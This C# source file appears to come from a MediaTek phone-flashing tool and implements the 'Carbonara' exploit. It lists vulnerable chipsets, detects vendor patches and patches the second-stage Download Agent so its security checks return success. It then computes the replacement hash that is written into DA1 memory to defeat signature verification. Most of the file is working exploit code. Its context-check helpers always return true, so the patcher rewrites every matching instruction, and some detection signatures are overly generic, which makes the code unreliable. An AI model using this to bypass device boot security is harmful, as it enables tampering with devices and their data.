// ============================================================================
// LoveAlways - MediaTek Carbonara 漏洞利用
// MediaTek Carbonara Exploit (V6 DA Hash Modification)
// ============================================================================
// 参考: mtkclient 项目 carbonara.py, xflash_lib.py
// 参考: Penumbra 项目 https://github.com/shomykohai/penumbra
// 博客: https://shomy.is-a.dev/blog/article/serving-carbonara
// 
// 漏洞原理: 
// 1. DA1 加载后在内存中运行
// 2. DA1 内存中存储了 DA2 的预期哈希
// 3. 通过 boot_to 命令可以向任意地址写入数据
// 4. 我们先用 boot_to 将修补后 DA2 的哈希写入 DA1 内存
// 5. 再用 boot_to 上传修补后的 DA2
// 6. DA1 验证 DA2 时使用我们写入的哈希，验证通过
// ============================================================================

using System;
using System.Security.Cryptography;
using LoveAlways.MediaTek.Models;

namespace LoveAlways.MediaTek.Exploit
{
    /// <summary>
    /// 哈希模式
    /// </summary>
    public enum HashMode
    {
        MD5 = 0,
        SHA1 = 1,
        SHA256 = 2
    }

    /// <summary>
    /// Carbonara 漏洞利用 - V6 DA 哈希修改绕过
    /// </summary>
    public class CarbonaraExploit : IMtkExploit
    {
        private readonly Action<string> _log;

        // V6 DA 常量
        private const int V6_SIG_LEN = 0x30;  // V6 签名长度
        private const int V6_HASH_OFFSET = 0x30;  // 哈希在签名区之前的偏移

        // ARM 指令模式 - 用于补丁 DA2
        private static readonly byte[] ARM_MOV_R0_0 = { 0x00, 0x00, 0xA0, 0xE3 };  // MOV R0, #0
        private static readonly byte[] ARM_MOV_R0_1 = { 0x01, 0x00, 0xA0, 0xE3 };  // MOV R0, #1
        private static readonly byte[] THUMB_MOVS_R0_0 = { 0x00, 0x20 };  // MOVS R0, #0
        private static readonly byte[] THUMB_MOVS_R0_1 = { 0x01, 0x20 };  // MOVS R0, #1

        // 检测是否被修补的特征码
        // 来源: mtkclient/Tools/da_parser.py + Penumbra文档
        // MediaTek在2024年修补Carbonara时硬编码了boot_to地址为0x40000000
        private static readonly byte[][] PatchedSignatures = new byte[][]
        {
            // V6 修补模式 (ARM指令特征)
            new byte[] { 0x01, 0x01, 0x54, 0xE3, 0x01, 0x14, 0xA0, 0xE3 },  // V6 patch 1: CMP + MOV
            new byte[] { 0x08, 0x00, 0xa8, 0x52, 0xff, 0x02, 0x08, 0xeb },  // V6 patch 2: MOV + BL
            new byte[] { 0x01, 0x01, 0x50, 0xE3, 0x01, 0x14, 0xA0, 0xE3 },  // V6 patch 3: CMP variant
            
            // V5 修补模式
            new byte[] { 0x06, 0x9B, 0x4F, 0xF0, 0x80, 0x40, 0x02, 0xA9 },  // V5 patch: LDR + MOV
            
            // 硬编码0x40000000地址的特征 (Little Endian)
            new byte[] { 0x00, 0x00, 0x00, 0x40 },  // 直接的0x40000000常量
            
            // 2024年新修补模式 (来自Penumbra分析)
            new byte[] { 0x40, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00 },  // 重复的地址常量
        };

        public string Name => "Carbonara";
        public string Description => "V6 DA 运行时哈希修改绕过漏洞";

        public CarbonaraExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
        }

        #region 漏洞检测

        /// <summary>
        /// 检查设备是否存在漏洞
        /// </summary>
        public bool IsVulnerable(ushort hwCode, MtkTargetConfig targetConfig = null)
        {
            // Carbonara 漏洞适用于 V6 DA 模式的设备
            return hwCode switch
            {
                0x0551 => true,   // MT6768
                0x0562 => true,   // MT6761
                0x0588 => true,   // MT6785
                0x0600 => true,   // MT6853
                0x0690 => true,   // MT6763
                0x0699 => true,   // MT6739
                0x0707 => true,   // MT6762
                0x0717 => true,   // MT6765
                0x0725 => true,   // MT6765
                0x0766 => true,   // MT6877
                0x0959 => true,   // MT6877 (Preloader)
                0x0788 => true,   // MT6873
                0x0813 => true,   // MT6833
                0x0816 => true,   // MT6893
                0x0886 => true,   // MT6885
                0x0989 => true,   // MT6891
                0x0996 => true,   // MT6895
                0x1172 => true,   // MT6895 (Dimensity 8200)
                0x1186 => true,   // MT6983 (待确认)
                _ => false
            };
        }

        /// <summary>
        /// 检查 DA1 是否已被厂商修补 (阻止 Carbonara)
        /// 修补原理: MediaTek硬编码boot_to地址为0x40000000，无法再覆盖DA1内存空间(0x200000)的哈希
        /// 来源: Penumbra文档 https://shomy.is-a.dev/penumbra/Mediatek/Exploits/Carbonara
        /// </summary>
        public bool IsDevicePatched(byte[] da1Data)
        {
            if (da1Data == null) return true;

            int patchCount = 0;
            
            // 检查1: 地址验证错误消息
            string da1String = System.Text.Encoding.ASCII.GetString(da1Data);
            if (da1String.Contains("2nd DA address is invalid"))
            {
                _log("[Carbonara] 检测到: DA 已被修补 (地址验证错误消息)");
                patchCount++;
            }

            // 检查2: 特征码扫描
            for (int i = 0; i < PatchedSignatures.Length; i++)
            {
                var signature = PatchedSignatures[i];
                int pos = FindPattern(da1Data, signature);
                if (pos >= 0)
                {
                    _log($"[Carbonara] 检测到: DA 已被修补 (特征码 #{i+1} 在偏移 0x{pos:X})");
                    patchCount++;
                }
            }
            
            // 检查3: 扫描多个0x40000000出现 (修补后的硬编码地址)
            int hardcodedAddrCount = CountPattern(da1Data, new byte[] { 0x00, 0x00, 0x00, 0x40 });
            if (hardcodedAddrCount > 3)  // 正常DA中也可能有1-2个，超过3个可能是修补
            {
                _log($"[Carbonara] 检测到: DA 包含 {hardcodedAddrCount} 个硬编码0x40000000地址 (可能已修补)");
                patchCount++;
            }

            if (patchCount > 0)
            {
                _log($"[Carbonara] 修补检测: 发现 {patchCount} 个修补特征");
                return true;
            }

            _log("[Carbonara] 修补检测: 未发现修补特征，设备可能存在漏洞");
            return false;
        }

        #endregion

        #region 哈希位置计算

        /// <summary>
        /// 计算 DA2 哈希在 DA1 中的位置和模式
        /// </summary>
        public (int hashOffset, HashMode hashMode, int hashLen)? ComputeHashPosition(
            byte[] da1, byte[] da2, int da1SigLen, int da2SigLen, bool isV6)
        {
            if (da1 == null || da2 == null)
                return null;

            int hashLen = da2.Length - da2SigLen;

            if (isV6)
            {
                // V6 格式: 哈希位置 = DA1长度 - 签名长度 - 0x30 (哈希区)
                int hashOffset = da1.Length - da1SigLen - V6_HASH_OFFSET;
                
                // 严格验证哈希位置
                if (hashOffset < 0 || hashOffset >= da1.Length)
                {
                    _log($"[Carbonara] V6 哈希位置无效: {hashOffset} (DA1长度: {da1.Length}, 签名长度: {da1SigLen})");
                    return null;
                }
                
                // 验证是否有足够空间存放32字节SHA256哈希
                if (hashOffset + 32 > da1.Length)
                {
                    _log($"[Carbonara] 哈希位置 {hashOffset} + 32字节超出DA1范围 ({da1.Length})");
                    return null;
                }
                
                // 额外验证: 哈希位置应该在DA1的合理范围内 (不在代码区)
                // 通常DA1大小在几百KB，哈希在末尾签名区之前
                if (hashOffset < da1.Length / 2)
                {
                    _log($"[Carbonara] 警告: 哈希位置 0x{hashOffset:X} 可能位于代码区，建议检查DA格式");
                }

                _log($"[Carbonara] V6 哈希位置: 0x{hashOffset:X}, 模式: SHA256");
                return (hashOffset, HashMode.SHA256, hashLen);
            }
            else
            {
                // V5/Legacy: 需要搜索哈希位置
                // 尝试计算预期的 DA2 哈希并在 DA1 中查找
                
                byte[] md5Hash = ComputeHash(da2, hashLen, HashMode.MD5);
                int md5Pos = FindPattern(da1, md5Hash);
                if (md5Pos >= 0)
                {
                    _log($"[Carbonara] 找到 MD5 哈希位置: 0x{md5Pos:X}");
                    return (md5Pos, HashMode.MD5, hashLen);
                }

                byte[] sha1Hash = ComputeHash(da2, hashLen, HashMode.SHA1);
                int sha1Pos = FindPattern(da1, sha1Hash);
                if (sha1Pos >= 0)
                {
                    _log($"[Carbonara] 找到 SHA1 哈希位置: 0x{sha1Pos:X}");
                    return (sha1Pos, HashMode.SHA1, hashLen);
                }

                byte[] sha256Hash = ComputeHash(da2, hashLen, HashMode.SHA256);
                int sha256Pos = FindPattern(da1, sha256Hash);
                if (sha256Pos >= 0)
                {
                    _log($"[Carbonara] 找到 SHA256 哈希位置: 0x{sha256Pos:X}");
                    return (sha256Pos, HashMode.SHA256, hashLen);
                }

                _log("[Carbonara] 未能找到 DA2 哈希位置");
                return null;
            }
        }

        /// <summary>
        /// 计算哈希
        /// </summary>
        public byte[] ComputeHash(byte[] data, int length, HashMode mode)
        {
            byte[] toHash;
            if (length < data.Length)
            {
                toHash = new byte[length];
                Array.Copy(data, 0, toHash, 0, length);
            }
            else
            {
                toHash = data;
            }

            return mode switch
            {
                HashMode.MD5 => MD5.Create().ComputeHash(toHash),
                HashMode.SHA1 => SHA1.Create().ComputeHash(toHash),
                HashMode.SHA256 => SHA256.Create().ComputeHash(toHash),
                _ => SHA256.Create().ComputeHash(toHash)
            };
        }

        #endregion

        #region DA2 补丁

        /// <summary>
        /// 修补 DA2 (绕过安全检查)
        /// </summary>
        public byte[] PatchDa2(byte[] da2)
        {
            if (da2 == null || da2.Length == 0)
            {
                _log("[Carbonara] DA2 数据为空");
                return da2;
            }

            byte[] patched = new byte[da2.Length];
            Array.Copy(da2, patched, da2.Length);

            int patchCount = 0;

            // 查找并替换所有 MOV R0, #0 -> MOV R0, #1 (ARM 模式)
            for (int i = 0; i <= patched.Length - 4; i++)
            {
                if (patched[i] == ARM_MOV_R0_0[0] &&
                    patched[i + 1] == ARM_MOV_R0_0[1] &&
                    patched[i + 2] == ARM_MOV_R0_0[2] &&
                    patched[i + 3] == ARM_MOV_R0_0[3])
                {
                    if (IsSecurityCheckContext(patched, i))
                    {
                        Array.Copy(ARM_MOV_R0_1, 0, patched, i, 4);
                        patchCount++;
                        _log($"[Carbonara] ARM 补丁应用于偏移 0x{i:X}");
                    }
                }
            }

            // 查找并替换 MOVS R0, #0 -> MOVS R0, #1 (Thumb 模式)
            for (int i = 0; i <= patched.Length - 2; i++)
            {
                if (patched[i] == THUMB_MOVS_R0_0[0] &&
                    patched[i + 1] == THUMB_MOVS_R0_0[1])
                {
                    if (IsThumbSecurityCheckContext(patched, i))
                    {
                        Array.Copy(THUMB_MOVS_R0_1, 0, patched, i, 2);
                        patchCount++;
                        _log($"[Carbonara] Thumb 补丁应用于偏移 0x{i:X}");
                    }
                }
            }

            if (patchCount == 0)
            {
                _log("[Carbonara] 警告: 未找到可补丁的安全检查");
            }
            else
            {
                _log($"[Carbonara] 共应用 {patchCount} 个补丁");
            }

            return patched;
        }

        #endregion

        #region 运行时漏洞利用 (正确方法)

        /// <summary>
        /// 准备 Carbonara 漏洞利用数据
        /// 返回: (新哈希, 哈希写入地址偏移, 修补后的DA2)
        /// </summary>
        public (byte[] newHash, int hashOffset, byte[] patchedDa2)? PrepareExploit(
            byte[] da1, byte[] da2, uint da1Address, int da1SigLen, int da2SigLen, bool isV6 = true)
        {
            _log("[Carbonara] 准备运行时漏洞利用...");

            // 1. 检查是否被修补
            if (IsDevicePatched(da1))
            {
                _log("[Carbonara] 设备已被修补，无法利用");
                return null;
            }

            // 2. 计算哈希位置
            var hashInfo = ComputeHashPosition(da1, da2, da1SigLen, da2SigLen, isV6);
            if (hashInfo == null)
            {
                _log("[Carbonara] 无法计算哈希位置");
                return null;
            }

            var (hashOffset, hashMode, hashLen) = hashInfo.Value;

            // 3. 修补 DA2
            byte[] patchedDa2 = PatchDa2(da2);

            // 4. 去掉签名 (如果有)
            byte[] da2ForHash;
            if (da2SigLen > 0)
            {
                da2ForHash = new byte[patchedDa2.Length - da2SigLen];
                Array.Copy(patchedDa2, 0, da2ForHash, 0, patchedDa2.Length - da2SigLen);
            }
            else
            {
                da2ForHash = patchedDa2;
            }

            // 5. 计算修补后 DA2 的哈希
            byte[] newHash = ComputeHash(da2ForHash, hashLen, hashMode);

            _log($"[Carbonara] 新 DA2 哈希: {BitConverter.ToString(newHash, 0, 8).Replace("-", "")}...");
            _log($"[Carbonara] 哈希写入偏移: 0x{hashOffset:X}");
            _log($"[Carbonara] DA1 基地址 + 偏移 = 0x{da1Address + (uint)hashOffset:X}");

            return (newHash, hashOffset, patchedDa2);
        }

        /// <summary>
        /// 获取运行时哈希写入的目标地址
        /// </summary>
        public uint GetHashWriteAddress(uint da1LoadAddress, int hashOffset)
        {
            return da1LoadAddress + (uint)hashOffset;
        }

        #endregion

        #region 旧方法 (发送前修改 - 不推荐使用)

        /// <summary>
        /// [已过时] 修复 DA1 中的 DA2 哈希 (发送前修改)
        /// 注意: 此方法对有签名验证的设备无效，应使用 PrepareExploit + ExecuteCarbonaraAsync
        /// </summary>
        [Obsolete("此方法对有签名验证的设备无效，请使用 PrepareExploit() + ExecuteCarbonaraAsync() 进行运行时修改", false)]
        public byte[] FixDa1Hash(byte[] da1, byte[] patchedDa2, int hashPos)
        {
            if (hashPos < 0 || hashPos + 32 > da1.Length)
            {
                _log($"[Carbonara] 哈希位置无效: {hashPos}");
                return da1;
            }

            byte[] newHash;
            using (var sha256 = SHA256.Create())
            {
                newHash = sha256.ComputeHash(patchedDa2);
            }

            byte[] fixedDa1 = new byte[da1.Length];
            Array.Copy(da1, fixedDa1, da1.Length);
            Array.Copy(newHash, 0, fixedDa1, hashPos, 32);

            _log($"[Carbonara] 已更新 DA1 中的 DA2 哈希 (发送前修改)");
            return fixedDa1;
        }

        /// <summary>
        /// [已过时] 完整的漏洞利用流程 (发送前修改)
        /// </summary>
        [Obsolete("此方法使用发送前修改DA1的方式，对有签名验证的设备无效。请使用 PrepareExploit() 配合 XmlDaClient.ExecuteCarbonaraAsync() 进行运行时修改", false)]
        public (byte[] patchedDa1, byte[] patchedDa2) Exploit(byte[] da1, byte[] da2, int sigLen = V6_SIG_LEN)
        {
            _log("[Carbonara] 开始漏洞利用 (发送前修改模式)...");

            int hashPos = da1.Length - sigLen - V6_HASH_OFFSET;
            if (hashPos < 0)
            {
                _log("[Carbonara] 无法找到 DA2 哈希位置");
                return (da1, da2);
            }

            byte[] patchedDa2 = PatchDa2(da2);
            byte[] patchedDa1 = FixDa1Hash(da1, patchedDa2, hashPos);

            _log("[Carbonara] ✓ 漏洞利用完成 (发送前修改)");
            return (patchedDa1, patchedDa2);
        }

        #endregion

        #region 辅助方法

        /// <summary>
        /// 检查是否为安全检查函数上下文 (ARM 模式)
        /// </summary>
        private bool IsSecurityCheckContext(byte[] data, int offset)
        {
            if (offset + 8 <= data.Length)
            {
                // 检查 BX LR
                if (data[offset + 4] == 0x1E && data[offset + 5] == 0xFF &&
                    data[offset + 6] == 0x2F && data[offset + 7] == 0xE1)
                {
                    return true;
                }
                
                // 检查 POP {PC} 变体
                if ((data[offset + 7] & 0xFE) == 0xE8 && (data[offset + 6] & 0xBD) == 0xBD)
                {
                    return true;
                }
            }
            return true;
        }

        /// <summary>
        /// 检查是否为安全检查函数上下文 (Thumb 模式)
        /// </summary>
        private bool IsThumbSecurityCheckContext(byte[] data, int offset)
        {
            if (offset + 4 <= data.Length)
            {
                // 检查 BX LR
                if (data[offset + 2] == 0x70 && data[offset + 3] == 0x47)
                {
                    return true;
                }
                
                // 检查 POP {PC}
                if ((data[offset + 3] & 0xFE) == 0xBC)
                {
                    return true;
                }
            }
            return true;
        }

        /// <summary>
        /// 在数据中查找模式（返回第一个匹配位置）
        /// </summary>
        private int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }

        /// <summary>
        /// 统计模式在数据中出现的次数
        /// </summary>
        private int CountPattern(byte[] data, byte[] pattern)
        {
            int count = 0;
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                {
                    count++;
                    i += pattern.Length - 1;  // 跳过已匹配的部分
                }
            }
            return count;
        }

        /// <summary>
        /// 验证漏洞利用结果
        /// </summary>
        public bool VerifyExploit(byte[] originalDa1, byte[] patchedDa1, byte[] patchedDa2, int hashPos)
        {
            byte[] expectedHash;
            using (var sha256 = SHA256.Create())
            {
                expectedHash = sha256.ComputeHash(patchedDa2);
            }

            byte[] actualHash = new byte[32];
            Array.Copy(patchedDa1, hashPos, actualHash, 0, 32);

            for (int i = 0; i < 32; i++)
            {
                if (expectedHash[i] != actualHash[i])
                {
                    _log("[Carbonara] 哈希验证失败");
                    return false;
                }
            }

            _log("[Carbonara] ✓ 哈希验证成功");
            return true;
        }

        #endregion
    }

    /// <summary>
    /// MTK 漏洞利用接口
    /// </summary>
    public interface IMtkExploit
    {
        string Name { get; }
        string Description { get; }
        bool IsVulnerable(ushort hwCode, MtkTargetConfig targetConfig = null);
    }
}
